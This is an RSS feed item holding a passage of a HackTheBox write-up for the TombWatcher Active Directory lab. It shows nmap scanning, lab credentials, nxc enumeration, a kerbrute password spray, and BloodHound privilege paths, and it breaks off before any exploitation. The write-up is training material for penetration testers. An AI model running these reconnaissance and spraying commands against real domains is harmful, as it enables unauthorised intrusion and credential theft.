@@ -1,0 +1,454 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Forcechangepassword on</title><link>https://h4r1337.github.io/tags/forcechangepassword/</link><description>Recent content in Forcechangepassword on</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Sun, 28 Jun 2026 21:18:49 +0530</lastBuildDate><atom:link href="https://h4r1337.github.io/tags/forcechangepassword/index.xml" rel="self" type="application/rss+xml"/><item><title>TombWatcher | HackTheBox</title><link>https://h4r1337.github.io/posts/tombwatcher/</link><pubDate>Sun, 28 Jun 2026 21:18:49 +0530</pubDate><guid>https://h4r1337.github.io/posts/tombwatcher/</guid><description>&lt;h3 id="overview">Overview&lt;/h3>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/tombwatcher/cover.webp">&lt;/figure>
+&lt;table>
+&lt;thead>
+&lt;tr>
+&lt;th style="text-align: center">Title&lt;/th>
+&lt;th style="text-align: center">&lt;a href="https://app.hackthebox.com/machines/TombWatcher">TombWatcher&lt;/a>&lt;/th>
+&lt;/tr>
+&lt;/thead>
+&lt;tbody>
+&lt;tr>
+&lt;td style="text-align: center">Difficulty&lt;/td>
+&lt;td style="text-align: center">Medium&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td style="text-align: center">Machine&lt;/td>
+&lt;td style="text-align: center">Windows&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td style="text-align: center">Makers&lt;/td>
+&lt;td style="text-align: center">&lt;a href="https://app.hackthebox.com/users/2984">&lt;img src="https://www.hackthebox.com/badge/image/2984" alt="" style="display: unset">&lt;/a> &amp;amp; &lt;a href="https://app.hackthebox.com/users/206770">&lt;img src="https://www.hackthebox.com/badge/image/206770" alt="" style="display: unset">&lt;/a>&lt;/td>
+&lt;/tr>
+&lt;/tbody>
+&lt;/table>
+&lt;br>
+&lt;div class="alert alert-tip collapsed">
+&lt;div class="alert-heading-box" onclick="toggleAlert(this)" >
+&lt;i class="bx bx-bulb">&lt;/i>
+&lt;p class="alert-heading">
+About TombWatcher
+&lt;/p>
+&lt;i class='bx bx-chevron-down collapsed'>&lt;/i>
+&lt;/div>
+&lt;div class="alert-content" style="display: none;" >
+&lt;p>TombWatcher is an assumed breach Active Directory machine. We will get initial credentials for user &lt;code>henry&lt;/code> and from there we will go through a straight forward escalation path by analyzing bloodhound data. In the end we will stumble upon a deleted user whom we have write access on and who also have enroll access on an ESC15 vulnerable template. We will restore the user exploit ESC15 to gain domain admin access.&lt;/p></description><content>&lt;h3 id="overview">Overview&lt;/h3>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/tombwatcher/cover.webp">&lt;/figure>
+&lt;table>
+&lt;thead>
+&lt;tr>
+&lt;th style="text-align: center">Title&lt;/th>
+&lt;th style="text-align: center">&lt;a href="https://app.hackthebox.com/machines/TombWatcher">TombWatcher&lt;/a>&lt;/th>
+&lt;/tr>
+&lt;/thead>
+&lt;tbody>
+&lt;tr>
+&lt;td style="text-align: center">Difficulty&lt;/td>
+&lt;td style="text-align: center">Medium&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td style="text-align: center">Machine&lt;/td>
+&lt;td style="text-align: center">Windows&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td style="text-align: center">Makers&lt;/td>
+&lt;td style="text-align: center">&lt;a href="https://app.hackthebox.com/users/2984">&lt;img src="https://www.hackthebox.com/badge/image/2984" alt="" style="display: unset">&lt;/a> &amp;amp; &lt;a href="https://app.hackthebox.com/users/206770">&lt;img src="https://www.hackthebox.com/badge/image/206770" alt="" style="display: unset">&lt;/a>&lt;/td>
+&lt;/tr>
+&lt;/tbody>
+&lt;/table>
+&lt;br>
+&lt;div class="alert alert-tip collapsed">
+&lt;div class="alert-heading-box" onclick="toggleAlert(this)" >
+&lt;i class="bx bx-bulb">&lt;/i>
+&lt;p class="alert-heading">
+About TombWatcher
+&lt;/p>
+&lt;i class='bx bx-chevron-down collapsed'>&lt;/i>
+&lt;/div>
+&lt;div class="alert-content" style="display: none;" >
+&lt;p>TombWatcher is an assumed breach Active Directory machine. We will get initial credentials for user &lt;code>henry&lt;/code> and from there we will go through a straight forward escalation path by analyzing bloodhound data. In the end we will stumble upon a deleted user whom we have write access on and who also have enroll access on an ESC15 vulnerable template. We will restore the user exploit ESC15 to gain domain admin access.&lt;/p>
+&lt;/div>
+&lt;/div>
+&lt;script>
+function toggleAlert(headerElement) {
+var alertBox = headerElement.parentElement;
+var alertContent = alertBox.querySelector('.alert-content');
+var icon = headerElement.querySelectorAll('i')[1];
+alertBox.classList.toggle('open');
+alertBox.classList.toggle('collapsed');
+if (alertBox.classList.contains('open')) {
+alertContent.style.display = 'block';
+icon.classList.remove('open');
+icon.classList.add('collapsed');
+} else {
+icon.classList.remove('collapsed');
+icon.classList.add('open');
+alertContent.style.display = 'none';
+}
+}
+&lt;/script>
+&lt;hr>
+&lt;h2 id="information-gathering">Information Gathering&lt;/h2>
+&lt;p>Scanned all TCP ports:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>nmap -p- --min-rate &lt;span style="color:#d3869b">10000&lt;/span> -vv $IP -oA recon/nmap/ports
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>Nmap scan report &lt;span style="color:#fe8019">for&lt;/span> 10.129.232.167
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host is up, received syn-ack &lt;span style="color:#fe8019">(&lt;/span>0.26s latency&lt;span style="color:#fe8019">)&lt;/span>.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Not shown: &lt;span style="color:#d3869b">65515&lt;/span> filtered tcp ports &lt;span style="color:#fe8019">(&lt;/span>no-response&lt;span style="color:#fe8019">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>PORT STATE SERVICE REASON
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>53/tcp open domain syn-ack
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>80/tcp open http syn-ack
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>88/tcp open kerberos-sec syn-ack
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>135/tcp open msrpc syn-ack
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>139/tcp open netbios-ssn syn-ack
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>389/tcp open ldap syn-ack
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>445/tcp open microsoft-ds syn-ack
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>464/tcp open kpasswd5 syn-ack
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>593/tcp open http-rpc-epmap syn-ack
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>636/tcp open ldapssl syn-ack
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>3268/tcp open globalcatLDAP syn-ack
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>3269/tcp open globalcatLDAPssl syn-ack
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>5985/tcp open wsman syn-ack
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>9389/tcp open adws syn-ack
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>49666/tcp open unknown syn-ack
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>49693/tcp open unknown syn-ack
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>49694/tcp open unknown syn-ack
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>49696/tcp open unknown syn-ack
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>49716/tcp open unknown syn-ack
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>62287/tcp open unknown syn-ack
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Enumerated open TCP ports:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>nmap -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -sC -sV --min-rate &lt;span style="color:#d3869b">10000&lt;/span> $IP -oA recon/nmap/service
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>Nmap scan report &lt;span style="color:#fe8019">for&lt;/span> 10.129.232.167
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host is up, received syn-ack &lt;span style="color:#fe8019">(&lt;/span>0.23s latency&lt;span style="color:#fe8019">)&lt;/span>.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Scanned at 2026-06-27 23:36:57 IST &lt;span style="color:#fe8019">for&lt;/span> 102s
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>PORT STATE SERVICE REASON VERSION
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>53/tcp open domain syn-ack Simple DNS Plus
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>80/tcp filtered http no-response
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>88/tcp open kerberos-sec syn-ack Microsoft Windows Kerberos &lt;span style="color:#fe8019">(&lt;/span>server time: 2026-06-27 22:12:19Z&lt;span style="color:#fe8019">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>135/tcp open msrpc syn-ack Microsoft Windows RPC
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>139/tcp open netbios-ssn syn-ack Microsoft Windows netbios-ssn
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>389/tcp open ldap syn-ack Microsoft Windows Active Directory LDAP &lt;span style="color:#fe8019">(&lt;/span>Domain: tombwatcher.htb, Site: Default-First-Site-Name&lt;span style="color:#fe8019">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| ssl-cert: Subject: commonName&lt;span style="color:#fe8019">=&lt;/span>DC01.tombwatcher.htb
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&amp;lt;unsupported&amp;gt;, DNS:DC01.tombwatcher.htb
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| Issuer: commonName&lt;span style="color:#fe8019">=&lt;/span>tombwatcher-CA-1/domainComponent&lt;span style="color:#fe8019">=&lt;/span>tombwatcher
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| Public Key type: rsa
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| Public Key bits: &lt;span style="color:#d3869b">2048&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| Signature Algorithm: sha1WithRSAEncryption
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| Not valid before: 2024-11-16T00:47:59
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| Not valid after: 2025-11-16T00:47:59
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| MD5: a396 4dc0 104d 3c58 54e0 19e3 c2ae &lt;span style="color:#d3869b">0666&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| SHA-1: fe5e 76e2 d528 4a33 8adf c84e 92e3 900e &lt;span style="color:#d3869b">4234&lt;/span> ef9c
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| SHA-256: &lt;span style="color:#d3869b">5128&lt;/span> aaea b79b bc06 762a 04d6 b475 4a21 a52c d1b1 205a &lt;span style="color:#d3869b">0440&lt;/span> 85bd f5d6 &lt;span style="color:#d3869b">2734&lt;/span> 6ea9
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| -----BEGIN CERTIFICATE-----
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| MIIF9jCCBN6gAwIBAgITLgAAAAKKaXDNTUaJbgAAAAAAAjANBgkqhkiG9w0BAQUF
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| ADBNMRMwEQYKCZImiZPyLGQBGRYDaHRiMRswGQYKCZImiZPyLGQBGRYLdG9tYndh
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;--------------- SNIP ----------------&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| UVh/6C+B68hnPsCF3DZFpO80im6G311u4izntBMGqxIhnIAVYFlR2H+HlFS+J0zo
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| x4qtaXNNmuaDW26OOtTf3FgylWUe5ji5MIq5UEupdOAI/xdwWV5M4gWFWZwNpSXG
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| Xq2engKcrfy4900Q10HektLKjyuhvSdWuyDwGW1L34ZljqsDsqV1S0SE
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_-----END CERTIFICATE-----
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ssl-date: 2026-06-27T22:13:50+00:00; +4h05m14s from scanner time.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>445/tcp open microsoft-ds? syn-ack
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>464/tcp open kpasswd5? syn-ack
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>593/tcp open ncacn_http syn-ack Microsoft Windows RPC over HTTP 1.0
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>636/tcp filtered ldapssl no-response
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>3268/tcp open ldap syn-ack Microsoft Windows Active Directory LDAP &lt;span style="color:#fe8019">(&lt;/span>Domain: tombwatcher.htb, Site: Default-First-Site-Name&lt;span style="color:#fe8019">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ssl-date: 2026-06-27T22:13:50+00:00; +4h05m14s from scanner time.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| ssl-cert: Subject: commonName&lt;span style="color:#fe8019">=&lt;/span>DC01.tombwatcher.htb
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&amp;lt;unsupported&amp;gt;, DNS:DC01.tombwatcher.htb
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| Issuer: commonName&lt;span style="color:#fe8019">=&lt;/span>tombwatcher-CA-1/domainComponent&lt;span style="color:#fe8019">=&lt;/span>tombwatcher
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| Public Key type: rsa
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| Public Key bits: &lt;span style="color:#d3869b">2048&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| Signature Algorithm: sha1WithRSAEncryption
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| Not valid before: 2024-11-16T00:47:59
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| Not valid after: 2025-11-16T00:47:59
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| MD5: a396 4dc0 104d 3c58 54e0 19e3 c2ae &lt;span style="color:#d3869b">0666&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| SHA-1: fe5e 76e2 d528 4a33 8adf c84e 92e3 900e &lt;span style="color:#d3869b">4234&lt;/span> ef9c
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| SHA-256: &lt;span style="color:#d3869b">5128&lt;/span> aaea b79b bc06 762a 04d6 b475 4a21 a52c d1b1 205a &lt;span style="color:#d3869b">0440&lt;/span> 85bd f5d6 &lt;span style="color:#d3869b">2734&lt;/span> 6ea9
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| -----BEGIN CERTIFICATE-----
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| MIIF9jCCBN6gAwIBAgITLgAAAAKKaXDNTUaJbgAAAAAAAjANBgkqhkiG9w0BAQUF
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| ADBNMRMwEQYKCZImiZPyLGQBGRYDaHRiMRswGQYKCZImiZPyLGQBGRYLdG9tYndh
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;--------------- SNIP ----------------&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| UVh/6C+B68hnPsCF3DZFpO80im6G311u4izntBMGqxIhnIAVYFlR2H+HlFS+J0zo
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| x4qtaXNNmuaDW26OOtTf3FgylWUe5ji5MIq5UEupdOAI/xdwWV5M4gWFWZwNpSXG
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| Xq2engKcrfy4900Q10HektLKjyuhvSdWuyDwGW1L34ZljqsDsqV1S0SE
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_-----END CERTIFICATE-----
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>3269/tcp open ssl/ldap syn-ack Microsoft Windows Active Directory LDAP &lt;span style="color:#fe8019">(&lt;/span>Domain: tombwatcher.htb, Site: Default-First-Site-Name&lt;span style="color:#fe8019">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ssl-date: 2026-06-27T22:13:50+00:00; +4h05m15s from scanner time.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| ssl-cert: Subject: commonName&lt;span style="color:#fe8019">=&lt;/span>DC01.tombwatcher.htb
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&amp;lt;unsupported&amp;gt;, DNS:DC01.tombwatcher.htb
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| Issuer: commonName&lt;span style="color:#fe8019">=&lt;/span>tombwatcher-CA-1/domainComponent&lt;span style="color:#fe8019">=&lt;/span>tombwatcher
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| Public Key type: rsa
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| Public Key bits: &lt;span style="color:#d3869b">2048&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| Signature Algorithm: sha1WithRSAEncryption
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| Not valid before: 2024-11-16T00:47:59
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| Not valid after: 2025-11-16T00:47:59
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| MD5: a396 4dc0 104d 3c58 54e0 19e3 c2ae &lt;span style="color:#d3869b">0666&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| SHA-1: fe5e 76e2 d528 4a33 8adf c84e 92e3 900e &lt;span style="color:#d3869b">4234&lt;/span> ef9c
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| SHA-256: &lt;span style="color:#d3869b">5128&lt;/span> aaea b79b bc06 762a 04d6 b475 4a21 a52c d1b1 205a &lt;span style="color:#d3869b">0440&lt;/span> 85bd f5d6 &lt;span style="color:#d3869b">2734&lt;/span> 6ea9
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| -----BEGIN CERTIFICATE-----
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| MIIF9jCCBN6gAwIBAgITLgAAAAKKaXDNTUaJbgAAAAAAAjANBgkqhkiG9w0BAQUF
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| ADBNMRMwEQYKCZImiZPyLGQBGRYDaHRiMRswGQYKCZImiZPyLGQBGRYLdG9tYndh
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;--------------- SNIP ----------------&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| UVh/6C+B68hnPsCF3DZFpO80im6G311u4izntBMGqxIhnIAVYFlR2H+HlFS+J0zo
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| x4qtaXNNmuaDW26OOtTf3FgylWUe5ji5MIq5UEupdOAI/xdwWV5M4gWFWZwNpSXG
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| Xq2engKcrfy4900Q10HektLKjyuhvSdWuyDwGW1L34ZljqsDsqV1S0SE
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_-----END CERTIFICATE-----
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>5985/tcp filtered wsman no-response
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>9389/tcp open mc-nmf syn-ack .NET Message Framing
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host script results:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| smb2-time:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| date: 2026-06-27T22:13:11
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ start_date: N/A
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| smb2-security-mode:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| 3.1.1:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ Message signing enabled and required
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| p2p-conficker:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| Checking &lt;span style="color:#fe8019">for&lt;/span> Conficker.C or higher...
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| Check &lt;span style="color:#d3869b">1&lt;/span> &lt;span style="color:#fe8019">(&lt;/span>port 52925/tcp&lt;span style="color:#fe8019">)&lt;/span>: CLEAN &lt;span style="color:#fe8019">(&lt;/span>Timeout&lt;span style="color:#fe8019">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| Check &lt;span style="color:#d3869b">2&lt;/span> &lt;span style="color:#fe8019">(&lt;/span>port 40660/tcp&lt;span style="color:#fe8019">)&lt;/span>: CLEAN &lt;span style="color:#fe8019">(&lt;/span>Timeout&lt;span style="color:#fe8019">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| Check &lt;span style="color:#d3869b">3&lt;/span> &lt;span style="color:#fe8019">(&lt;/span>port 60904/udp&lt;span style="color:#fe8019">)&lt;/span>: CLEAN &lt;span style="color:#fe8019">(&lt;/span>Timeout&lt;span style="color:#fe8019">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| Check &lt;span style="color:#d3869b">4&lt;/span> &lt;span style="color:#fe8019">(&lt;/span>port 33558/udp&lt;span style="color:#fe8019">)&lt;/span>: CLEAN &lt;span style="color:#fe8019">(&lt;/span>Timeout&lt;span style="color:#fe8019">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ 0/4 checks are positive: Host is CLEAN or ports are blocked
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_clock-skew: mean: 4h05m14s, deviation: 0s, median: 4h05m13s
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Since this is an AD assumed breach scenario we have initial credentials to work with.&lt;/p>
+&lt;blockquote>
+&lt;p>As is common in real life Windows pentests, you will start the TombWatcher box with credentials for the following account: henry / H3nry_987TGV!&lt;/p>
+&lt;/blockquote>
+&lt;p>Let&amp;rsquo;s verify the credentials and generate hosts file using &lt;code>nxc&lt;/code> (two birds with one command):&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>sudo nxc smb $IP -u henry -p &lt;span style="color:#b8bb26">&amp;#39;H3nry_987TGV!&amp;#39;&lt;/span> --generate-hosts-file /etc/hosts
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/tombwatcher/Pasted%20image%2020260627234733.webp">&lt;/figure>
+&lt;p>The credentials are working.&lt;/p>
+&lt;hr>
+&lt;h2 id="enumeration">Enumeration&lt;/h2>
+&lt;h3 id="smb">SMB&lt;/h3>
+&lt;p>Checking if we have access on any interesting shares.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>nxc smb tombwatcher.htb -u henry -p &lt;span style="color:#b8bb26">&amp;#39;H3nry_987TGV!&amp;#39;&lt;/span> --shares
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/tombwatcher/Pasted%20image%2020260627235415.webp">&lt;/figure>
+&lt;p>Nothing useful. I exported list of users available:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>nxc smb tombwatcher.htb -u henry -p &lt;span style="color:#b8bb26">&amp;#39;H3nry_987TGV!&amp;#39;&lt;/span> --users-export users.txt
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/tombwatcher/Pasted%20image%2020260628163530.webp">&lt;/figure>
+&lt;h3 id="rusthound">Rusthound&lt;/h3>
+&lt;p>I used &lt;a href="https://github.com/g0h4n/RustHound-CE">&lt;code>rusthound&lt;/code>&lt;/a> for collecting bloodhound data:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>rusthound-ce -d tombwatcher.htb -u &lt;span style="color:#b8bb26">&amp;#39;henry&amp;#39;&lt;/span> -p &lt;span style="color:#b8bb26">&amp;#39;H3nry_987TGV!&amp;#39;&lt;/span> --zip
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/tombwatcher/Pasted%20image%2020260627235511.webp">&lt;/figure>
+&lt;h3 id="password-spray">Password spray&lt;/h3>
+&lt;p>We can do a password spray attack with the password we have and the available users:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>faketime -f &lt;span style="color:#b8bb26">&amp;#39;+4.05h&amp;#39;&lt;/span> kerbrute passwordspray --dc DC01.tombwatcher.htb -d tombwatcher.htb users.txt &lt;span style="color:#b8bb26">&amp;#39;H3nry_987TGV!&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/tombwatcher/Pasted%20image%2020260627235854.webp">&lt;/figure>
+&lt;h3 id="bloodhound-enumeration">Bloodhound Enumeration&lt;/h3>
+&lt;p>Henry have WriteSPN permission on Alfred&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/tombwatcher/Pasted%20image%2020260628001104.webp">&lt;/figure>
+&lt;p>Can be abused using targeted kerberoasting.&lt;/p>
+&lt;p>Alfred have &lt;code>AddSelf&lt;/code> over the group&lt;code>infrastructure&lt;/code>&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/tombwatcher/Pasted%20image%2020260628003201.webp">&lt;/figure>
+&lt;p>Members of &lt;code>infrastructure&lt;/code> group have &lt;code>ReadGMSAPassword&lt;/code> over the machine account &lt;code>ansible_dev$&lt;/code>:&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/tombwatcher/Pasted%20image%2020260628003825.webp">&lt;/figure>
+&lt;p>And &lt;code>ansible_dev$&lt;/code> have &lt;code>ForceChangePassword&lt;/code> over user &lt;code>sam&lt;/code>:&lt;/p>
+&lt;figure>
